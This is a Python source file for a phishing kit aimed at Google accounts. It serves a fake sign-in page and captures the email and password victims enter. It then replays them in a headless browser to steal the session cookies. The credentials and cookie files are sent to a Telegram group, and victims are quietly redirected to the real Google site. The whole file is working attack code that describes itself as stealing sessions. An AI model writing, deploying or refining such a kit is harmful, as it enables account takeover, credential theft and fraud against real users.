import os
import json
import asyncio
import telebot
from quart import Quart, render_template, request, redirect
from playwright.async_api import async_playwright
from threading import Thread

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
GROUP_ID = int(os.environ.get("GROUP_ID", 0))
BASE_URL = os.environ.get("BASE_URL", "").rstrip('/')

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

async def capture_google_session(email, password, tid):
    """
    Automated Headless Browser: Logs in to Google, 
    bypasses simple checks, and steals session cookies.
    """
    async with async_playwright() as p:
        # Launching with specific arguments to pass Koyeb/Docker restrictions
        browser = await p.chromium.launch(
            headless=True, 
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
        )
        
        # Using a high-quality User Agent to look like a real Windows Chrome browser
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        )
        page = await context.new_page()

        try:
            # 1. Navigate to Google Sign-in
            await page.goto("https://accounts.google.com/signin", timeout=60000)
            
            # 2. Enter Email
            await page.fill('input[type="email"]', email)
            await page.click('#identifierNext')
            await asyncio.sleep(2)

            # 3. Enter Password
            await page.fill('input[type="password"]', password)
            await page.click('#passwordNext')
            
            # 4. Wait for Successful Login (Redirect to Account Page)
            # This timeout is long to account for slow server IPs
            await page.wait_for_url("**/myaccount**", timeout=30000)

            # 5. Extract Session Cookies
            cookies = await context.cookies()
            cookie_data = json.dumps(cookies, indent=2)
            
            filename = f"session_{email}.json"
            with open(filename, "w") as f:
                f.write(cookie_data)
            
            # Send to Telegram Group
            with open(filename, "rb") as f:
                caption = (
                    "🔥 **GOOGLE SESSION CAPTURED**\n"
                    "━━━━━━━━━━━━━━━\n"
                    f"👤 **Email:** `{email}`\n"
                    f"🔑 **Pass:** `{password}`\n"
                    f"🆔 **TID:** `{tid}`\n"
                    "━━━━━━━━━━━━━━━\n"
                    "✅ *Cookie file attached below.*"
                )
                bot.send_document(GROUP_ID, f, caption=caption, parse_mode="Markdown")
            
            # Cleanup
            os.remove(filename)
            
        except Exception as e:
            # Log failure (usually triggered by 2FA or suspicious activity block)
            error_msg = (
                "⚠️ **SESSION CAPTURE FAILED**\n"
                f"👤 **User:** `{email}`\n"
                f"🔑 **Pass:** `{password}`\n"
                f"❌ **Error:** `{str(e)[:100]}`"
            )
            bot.send_message(GROUP_ID, error_msg, parse_mode="Markdown")
        finally:
            await browser.close()

# --- WEB ROUTES ---

@app.route('/')
async def index():
    tid = request.args.get('tid', 'Unknown')
    email = request.args.get('email', '')
    error = request.args.get('error', '')
    # Serves the google.html from /templates folder
    return await render_template('google.html', tid=tid, email=email, error_type=error)

@app.route('/login', methods=['POST'])
async def login():
    form_data = await request.form
    email = form_data.get('identifier')
    password = form_data.get('password')
    tid = form_data.get('tid')

    # Run the scraper in a background task so the web UI stays fast
    asyncio.create_task(capture_google_session(email, password, tid))

    # Natural redirect to real Google
    return redirect("https://accounts.google.com/manageaccount")

@bot.message_handler(commands=['link'])
def send_link(m):
    url = f"{BASE_URL}/?tid={m.from_user.id}"
    bot.reply_to(m, f"🔗 **Your Relay Link:**\n`{url}`", parse_mode="Markdown")

# --- RUNNER ---
def start_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    # Start Telegram Bot in background thread
    Thread(target=start_bot).start()
    # Start Web Server
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
